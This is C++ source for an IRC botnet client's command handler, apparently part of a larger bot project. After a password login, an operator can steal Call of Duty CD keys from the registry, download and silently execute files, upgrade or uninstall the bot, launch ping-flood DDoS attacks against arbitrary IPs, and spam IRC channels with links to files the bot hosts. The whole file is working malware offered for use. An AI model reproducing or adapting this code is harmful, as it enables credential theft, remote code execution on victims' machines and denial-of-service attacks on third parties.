#include "Irc.h"

Irc::Irc()
{
	HTTP_PORT = 0;
	int num = 0;
	const int *SL = new int(num); 
	SecureLogin = new char*[*SL];
	SecureLogin[0] = "";
	chk_join = 0;
}

void Irc::IrcRegistration(SOCKET sock, char *Name, char *Mail, char *Idnt, char *Serv, char *Nick1, char *Nick2, char *Nick3)
{
	char *ip = new char[20];
	char u[] = "\x22";

	RTSR  = new char[1024];
	NICK1 = new char[255];
	NICK2 = new char[255];
	NICK3 = new char[255];
	USER  = new char[255];
	PASS  = new char[255]; 
	SERV  = new char[255];

	memset(RTSR, '\0', 1024);

	ip = NET.GetLocalIp();

	IRC_REG IR;

	IR.Name = Name;
	IR.Mail = Mail;
	IR.Idnt = Idnt;
	IR.Serv = Serv;
	
    sprintf(NICK1, "NICK %s [0]\n", Nick1);
	sprintf(NICK2, "NICK %s [1]\n", Nick2);
	sprintf(NICK3, "NICK %s [2]\n", Nick3);

	sprintf(USER, "USER %s %s%s %s%s%s :%s\n", Idnt, u, u, u, Serv, u, Name);
    //sprintf(SERV, "SERVER %s 0 SERVER\n", Serv);
	//sprintf(PASS, "PASS anonymous\n");

	//strcat(RTSR, PASS);
	strcat(RTSR, NICK1);
	strcat(RTSR, NICK2);
	strcat(RTSR, NICK3);
	strcat(RTSR, USER);
	//strcat(RTSR, SERV);

	NET.Send(RTSR, sock);

	delete RTSR, NICK1, NICK2, NICK3, USER, PASS, SERV, ip;
}

int Irc::IrcCommands(SOCKET sock, char *text)
{
	if(strstr(text, "MOTD"))
	{
		if(chk_join == 0)
		{
			chk_join++;
			char *j = new char[150];
			memset(j, '\0', 150);
			
			sprintf(j, "JOIN %s %s\n", CHANNEL, CKEY);
			NET.Send(j, sock);
		}
	}

	return_me = 0;
	switch_me = 0;

	char *tmp1, *tmp2;
	tmp1 = text;
	tmp2 = text;

	//tmp1 = ++tmp2;

	while(*tmp2 && !strchr(" ", *tmp2))
		++tmp2;
	arg1.assign(tmp1, tmp2 - tmp1);
	if(*tmp2 != isspace(*tmp2))
        tmp1 = ++tmp2;

	while(*tmp2 && !strchr(" ", *tmp2))
		++tmp2;
	arg2.assign(tmp1, tmp2 - tmp1);
	if(*tmp2 != isspace(*tmp2))
        tmp1 = ++tmp2;

	while(*tmp2 && !strchr("\n", *tmp2))
		++tmp2;
	arg3.assign(tmp1, tmp2 - tmp1);
	if(*tmp2 != '\n')
        tmp1 = ++tmp2;

	if(strcmp(arg1.c_str(), "PING") == 0)
	{
		switch_me = 1;
	}
	if(strcmp(arg2.c_str(), "KICK") == 0)
	{
		switch_me = 2;
	}
	if(strcmp(arg2.c_str(), "MODE") == 0)
	{
		switch_me = 3;
	}
	if(strcmp(arg2.c_str(), "PRIVMSG") == 0)
	{
		switch_me = 4;
	}
	if(strcmp(arg2.c_str(), "JOIN") == 0)
	{
		switch_me = 5;
	}
	if(strcmp(arg2.c_str(), "PART") == 0)
	{
		switch_me = 6;
	}
	if(strcmp(arg2.c_str(), "QUIT") == 0)
	{
		switch_me = 7;
	}

	switch(switch_me)
	{
	case PING:
		{
			/*int arg2len = strlen(arg2.c_str());
			char *tmp = new char[arg2len];
			memset(tmp, '\0', arg2len);
			strcpy(tmp, arg2.c_str());
            ++tmp;

			char *amp = new char[255];
			memset(amp, '\0', 255);

			sprintf(amp, "PONG nick %s\n", tmp);
			NET.Send(amp, sock);

			std::cout << "PING ... PONG" << std::endl;*/
			break;
		}
	case KICK:
		{
			printf("RECV: KICK!\n");
			break;
		}
	case MODE:
		{
			printf("RECV: MODE\n");
			break;
		}
	case PRIVMSG:
		{
			int st_besed;
			char **command;

			std::string BotNick;
			const char *a1, *a2;
			
			a1 = arg3.c_str();
			a2 = arg3.c_str();

			while(*a2 && !strchr(" ", *a2))
				++a2;
			BotNick.assign(a1, a2 - a1);
			if(*a2 != isspace(*a2))
				a1 = ++a2;
                a1 = ++a2;
				
			std::string AddSpText;
			const char *b1, *b2;
			b1 = a2;
			b2 = a2;
				
			while(*b2 && !strchr(" ", *b2))
					++b2;
			AddSpText.assign(b1, b2 - b1);
			if(*b2 != isspace(*b2))
				b1 = ++b2;

			// add spam text! command!!!
			if((strcmp(AddSpText.c_str(), "!addSPText") == 0) && (strcmp(SecureLogin[0], arg1.c_str()) == 0))
			{
				SPAMText = new char[356];
				strnset(SPAMText, '\0', 356);
				
				sprintf(SPAMText, "%s", b2);
				
				SPAMText = USE.OdstraniZadnjiZnak(SPAMText);
				
				char *sinfo = new char[255];
				memset(sinfo, '\0', 255);
				sprintf(sinfo, "NOTICE %s :Text is added: %s\n", BotNick.c_str(), SPAMText);
				NET.Send(sinfo, sock);
				delete sinfo;
			}
			
			st_besed = USE.GetNumWords(a2);
			st_besed -= 1;

			const int *st = new int(st_besed);
			command = new char*[*st];

			for(int i = 0; i <= st_besed; i++)
			{
				std::string com;
				while(*a2 && !strchr(" ", *a2))
					++a2;
                com.assign(a1, a2 - a1);
				if(*a2 != isspace(*a2))
					a1 = ++a2;

				int comlen = strlen(com.c_str());
				char *Com = new char[comlen];
				memset(Com, '\0', comlen);
				strcpy(Com, com.c_str());

				command[i] = Com;
			}

			if(st_besed == 0) // ena beseda za ukaz
			{
				command[0] = USE.OdstraniZadnjiZnak(command[0]);

				if(strcmp(command[0], "!showSPChan") == 0)
				{
					SPM.ShowAddedChannels(sock, BotNick);
				}

				if((strcmp(command[0], "!getcdkey") == 0) && (strcmp(SecureLogin[0], arg1.c_str()) == 0))
				{
					char *snd = new char[512];
					memset(snd, '\0', 512);
					char *cdkey;

					cdkey = THIF.CheckForCdKey(HKEY_LOCAL_MACHINE, "Software\\Activision\\Call of Duty United Offensive", "key", "COD UO");
                    if(strcmp(cdkey, "0") != 0)
					{
						sprintf(snd, "PRIVMSG %s :%s\n", BotNick.c_str(), cdkey);
						NET.Send(snd, sock);
					}

					cdkey = THIF.CheckForCdKey(HKEY_LOCAL_MACHINE, "Software\\Activision\\Call of Duty", "codkey", "COD");
                    if(strcmp(cdkey, "0") != 0)
					{
						sprintf(snd, "PRIVMSG %s :%s\n", BotNick.c_str(), cdkey);
						NET.Send(snd, sock);
					}
				}

				if((strcmp(command[0], "!closeHTTP") == 0) && (strcmp(SecureLogin[0], arg1.c_str()) == 0))
				{
					SPM.CloseHttpServer(HTTP_PORT);
					RemoveHttp(DIR_HTTP, h_file);
					HTTP_PORT = 0;
				}

				if((strcmp(command[0], "!test") == 0) && (strcmp(SecureLogin[0], arg1.c_str()) == 0))
				{
					SPM.SpamSend("JOIN #askari\n", sock);
					char *r = SPM.SpamRecv(sock);
					SPM.SpamSend("PART #askari\n", sock);

					const int * cc = new int(1000);
					char ** pp = new char*[*cc];

					int numm = SPM.GetSpamNick(pp, r);

					for(int i = 0; i < numm; i++)
					{
						printf("NNNN: %s\n", pp[i]);
					}

					delete pp;
				}

				/*if((strcmp(command[0], "!auto") == 0) && (strcmp(SecureLogin[0], arg1.c_str()) == 0))
				{
					char hs[20];
					sprintf(hs, "%i", HTTP_PORT);
					
					char * HTTP = new char[100];
					strnset(HTTP, '\0', 100);
					
					strcpy(HTTP, " http://");
					strcat(HTTP, NET.GetLocalIp());
					strcat(HTTP, ":");
					strcat(HTTP, hs);
					strcat(HTTP, "/");

					SPM.AutoSpam(sock, HTTP);

					delete HTTP;
				}*/
			}

			if(st_besed == 1) // dve besedi za ukaz
			{
				command[1] = USE.OdstraniZadnjiZnak(command[1]);



				// !add spam channels!
				if((strcmp(command[0], "!addSPChan") == 0) && (strcmp(SecureLogin[0], arg1.c_str()) == 0))
				{
					if(command[1][0] == '#')
					{
						SPM.FillSpamChans(command[1], BotNick, sock);
					}
					else
					{
						char *sinfo = new char[255];
						memset(sinfo, '\0', 255);
						sprintf(sinfo, "NOTICE %s :Please first char must be # ! tnx\n", BotNick.c_str());

						NET.Send(sinfo, sock);
						delete sinfo;
					}
				}

				// remove spam channel!
				if((strcmp(command[0], "!remSPChan") == 0) && (strcmp(SecureLogin[0], arg1.c_str()) == 0))
				{
					SPM.RemoveChannel(sock, BotNick, atoi(command[1]));
				}

				// LOGIN
				if(strlen(SecureLogin[0]) == 0)
				{
					if((strcmp(command[0], "!login") == 0) && (strcmp(command[1], BOTPASS) == 0))
					{
						char *sinfo = new char[255];
						memset(sinfo, '\0', 255);
						sprintf(sinfo, "NOTICE %s :Thank you for login!\n", BotNick.c_str());

						NET.Send(sinfo, sock);
						delete sinfo;

						printf("LOGIN SUCESS!!!\n");
						int tmplen = strlen(arg1.c_str());
						char *tmp = new char[tmplen];
						memset(tmp, '\0', tmplen);
						strcpy(tmp, arg1.c_str());
						SecureLogin[0] = tmp;
					}
				}

				// JOIN
				if((strcmp(command[0], "!join") == 0) && (strcmp(SecureLogin[0], arg1.c_str()) == 0))
				{
					char *tmp = new char[255];
					memset(tmp, '\0', 255);
					sprintf(tmp, "JOIN %s\n", command[1]);
					NET.Send(tmp, sock);
					delete tmp;
				}

				// PART
				if((strcmp(command[0], "!part") == 0) && (strcmp(SecureLogin[0], arg1.c_str()) == 0))
				{
					char *tmp = new char[255];
					memset(tmp, '\0', 255);
					sprintf(tmp, "PART %s\n", command[1]);
					NET.Send(tmp, sock);
					delete tmp;
				}

				// QUIT
				if((strcmp(command[0], "!quit") == 0) && (strcmp(SecureLogin[0], arg1.c_str()) == 0))
				{
					char *tmp = new char[255];
					memset(tmp, '\0', 255);
					sprintf(tmp, "QUIT :%s\n", command[1]);
					NET.Send(tmp, sock);
					delete tmp;
					return_me = 9996999;
				}
				
				if((strcmp(command[0], "!uninstall") == 0) && (strcmp(SecureLogin[0], arg1.c_str()) == 0) && (strcmp(command[1], "devil") == 0))
				{
					printf("UNINSTALING U LAMA B0Y!\n");
					SPM.CloseHttpServer(HTTP_PORT);
					RemoveHttp(DIR_HTTP, h_file);
					SEC.BotUninstall();

					return_me = 9996999;
				}
			}

			if(st_besed == 2) // tri beseda za ukaz
			{
				command[2] = USE.OdstraniZadnjiZnak(command[2]);

				// update bot upgrade!
				if((strcmp(command[0], "!upgrade") == 0) && (strcmp(SecureLogin[0], arg1.c_str()) == 0))
				{
					printf("UPGRADING!\n");

					SPM.CloseHttpServer(HTTP_PORT);

					char *server    = USE.RServer(command[1], 1);
					char *port      = USE.RServer(command[1], 2);
					char *file_down = USE.RServer(command[1], 3);
					char *tp_s      = SEC.GetFilePath(command[2]);

					if(USE.FileExist(tp_s) == 1)
						remove(tp_s);

					int rcheck;

					rcheck = NET.WebDownload(server, atoi(port), file_down, tp_s, sock);
					
					if(USE.FileExist(tp_s) == 0)
					{
						char *sinfo = new char[255];
						memset(sinfo, '\0', 255);
						sprintf(sinfo, "NOTICE %s :Download isn't sucess!\n", BotNick.c_str());
						NET.Send(sinfo, sock);
						delete sinfo;
					}
					else
					{
						SEC.BotUpgrade(tp_s);
						return_me = 9996999;
					}
				}
			}
			
			if(st_besed == 3)
			{
				command[3] = USE.OdstraniZadnjiZnak(command[3]);
				
				if((strcmp(command[0], "!install_HTTP") == 0) && (strcmp(SecureLogin[0], arg1.c_str()) == 0))
				{
					
					if(HTTP_PORT > 0 || HTTP_PORT == atoi(command[3]))
					{
						char *tmp = new char[256];
						strnset(tmp, '\0', 256);
						sprintf(tmp, "NOTICE %s :HTTP Server Already running on %i port! \n", BotNick.c_str(), HTTP_PORT);
						NET.Send(tmp, sock);
						delete tmp;
					}
					else
					{
						printf("Uplodam http!\n");

						char *http_path = new char[256];
						strnset(http_path, '\0', 256);
						strcpy(http_path, SEC.GetTempDir(2));
						strcat(http_path, DIR_HTTP);
						
						SEC.MakeDirectory(http_path);
						
						strcat(http_path, "\\");
						strcat(http_path, command[2]);
						
						strcpy(h_file, command[2]);
						char *server    = USE.RServer(command[1], 1);
						char *port      = USE.RServer(command[1], 2);
						char *file_down = USE.RServer(command[1], 3);
						
						int chk = NET.WebDownload(server, atoi(port), file_down, http_path, sock);
						
						char *up_file = new char[256];
						strnset(up_file, '\0', 256);
						
						strcpy(up_file, SEC.GetTempDir(2));
						strcat(up_file, DIR1);
						strcat(up_file, "\\");
						strcat(up_file, FILE1);
						
						char *two_args = new char[512];
						strnset(two_args, '\0', 512);
						
						sprintf(two_args, "%s %s", up_file, command[3]); // up_file, port
						
						printf("%s\n", two_args);
						
						ShellExecute(0, "open", http_path, two_args, 0, SW_HIDE);

						HTTP_PORT = atoi(command[3]);
						
						delete http_path, up_file, two_args;
					}
				}
			}

			if(st_besed == 4)
			{
				if((strcmp(command[0], "!ddos-ping") == 0) && (strcmp(SecureLogin[0], arg1.c_str()) == 0))
				{
					printf("DDOSING\n");
					// !ddos-ping 127.0.0.1 10000 500 100
					command[4] = USE.OdstraniZadnjiZnak(command[4]);
					
					int count = 0;
					int PS = atoi(command[2]); // num byte
					int DL = atoi(command[3]); // delay
					int NL = atoi(command[4]); // num loop
					
					while(count < NL)
					{
						DDOS.PingFlood(command[1], PS);
						Sleep(DL);
						count++;
					}
				}

				// start spam!
				if((strcmp(command[0], "!startSP") == 0) && (strcmp(SecureLogin[0], arg1.c_str()) == 0))
				{
					if(HTTP_PORT == 0)
					{
						char *tmp = new char[256];
						strnset(tmp, '\0', 256);
						sprintf(tmp, "NOTICE %s :Please Install HTTP server!\n", BotNick.c_str());
						NET.Send(tmp, sock);
						delete tmp;
					}
					if(SPAMText == 0)
					{
						char *tmp = new char[256];
						strnset(tmp, '\0', 256);
						sprintf(tmp, "NOTICE %s :Please setup spm Text!\n", BotNick.c_str());
						NET.Send(tmp, sock);
						delete tmp;
					}
					else
					{
						char *sinfo = new char[255];
						memset(sinfo, '\0', 255);
						sprintf(sinfo, "NOTICE %s :Starting spm!\n", BotNick.c_str());

						NET.Send(sinfo, sock);
						delete sinfo;

						char * SP = new char[356];
						strnset(SP, '\0', 356);

						char hs[20];
						sprintf(hs, "%i", HTTP_PORT);

						char * HTTP = new char[100];
						strnset(HTTP, '\0', 100);
						
						strcpy(HTTP, " http://");
						strcat(HTTP, NET.GetLocalIp());
						strcat(HTTP, ":");
						strcat(HTTP, hs);
						strcat(HTTP, "/");
						strcat(HTTP, command[2]);

						sprintf(SP, "%s %s", SPAMText, HTTP);

						printf("SPM: %s\n", SP);
						
						SPM.StartSpam(sock, atoi(command[1]), SP, BotNick, atoi(command[3]), atoi(command[4]));

						delete SP, HTTP, SPAMText;
					}
				}
			}

			/*std::cout << BotNick.c_str() << std::endl;
			std::cout << a2 << std::endl;
			std::cout << st_besed << std::endl;*/

			break;
		}
	case JOIN:
		{
			printf("RECV: JOIN\n");
			break;
		}
	case PART:
		{
			if(strcmp(arg1.c_str(), SecureLogin[0]) == 0)
			{
				SecureLogin[0] = "";
			}

			break;
		}
	case QUIT:
		{
			if(strcmp(arg1.c_str(), SecureLogin[0]) == 0)
			{
				SecureLogin[0] = "";
			}
			break;
		}
	default:
		{
			printf("RECV: IRC default switch!!\n");
		}
	}

	//printf("%s\n%s\n%s\n", arg1.c_str(), arg2.c_str(), arg3.c_str());

	return return_me;
}

char *Irc::GetRandomNick(char *nick, int w)
{
	int rnum;
	char *Rnick = new char[100];
	srand(time(0));
	rnum = rand() % 9999 + 0;

	if(w == 1)
	{
	    sprintf(Rnick, "%s-%i", nick, rnum);
	}
	if(w == 0)
	{
		sprintf(Rnick, "%s%i", nick, rnum);
	}

	return Rnick;
}

void Irc::RemoveHttp(char *dir, char *file)
{
	char *dp, *fp;
	dp = new char[256];
	fp = new char[256];

	strnset(dp, '\0', 256);
	strnset(fp, '\0', 256);

	strcpy(dp, SEC.GetTempDir(2));
	strcat(dp, DIR_HTTP);

	strcpy(fp, SEC.GetTempDir(2));
	strcat(fp, DIR_HTTP);
	strcat(fp, h_file);

	remove(fp);
	RemoveDirectory(dp);
}

/*
Recved from MIRC: NOTICE SecureServ :¢VERSION mIRC v6.16 Khaled Mardam-Bey¢

Prox Send: NOTICE SecureServ :¢VERSION mIRC v6.16 Khaled Mardam-Bey¢
*/